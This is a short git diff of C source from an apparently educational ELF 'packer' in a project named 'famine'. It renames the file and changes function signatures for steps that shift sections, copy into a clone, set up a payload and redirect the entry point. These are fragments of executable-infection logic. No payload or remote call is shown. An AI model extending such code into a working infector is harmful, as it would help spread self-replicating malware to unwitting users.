@@ -1,12 +1,12 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   elf64_packer.c                                     :+:      :+:    :+:   */
+/*   packer.c                                           :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/05 05:14:39 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/06 04:53:36 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -77,8 +77,6 @@ static bool	define_shift_amount(const struct endians_pointer endians,
 	const size_t	p_align = endians.endian_8(original_entry->safe_phdr->p_align);
 
 	*shift_amount = ALIGN(payload_size, SHIFT_ALIGNMENT);
-	// if (!resize_clone(*shift_amount))
-	// 	return false;
 
 	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;
 
@@ -92,10 +90,10 @@ bool		elf64_packer(const struct famine food, size_t original_file_size)
 
 	if (!find_entry(&original_entry, food.original_safe, food.endians)
 	|| !define_shift_amount(food.endians, &original_entry, &shift_amount)
-	|| !copy_to_clone(original_entry.end_of_last_section, shift_amount, original_file_size)
-	|| !adjust_references(shift_amount, &original_entry)
+	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
+	|| !adjust_references(food.clone_safe , food.endians, shift_amount, &original_entry)
 	|| !adjust_sizes(food.endians, food.clone_safe, shift_amount)
-	|| !setup_payload(&original_entry, food.endians)
+	|| !setup_payload(&original_entry, food.endians, food.clone_safe)
 	|| !change_entry(food.clone_safe, food.endians, &original_entry))
 		return false;
 
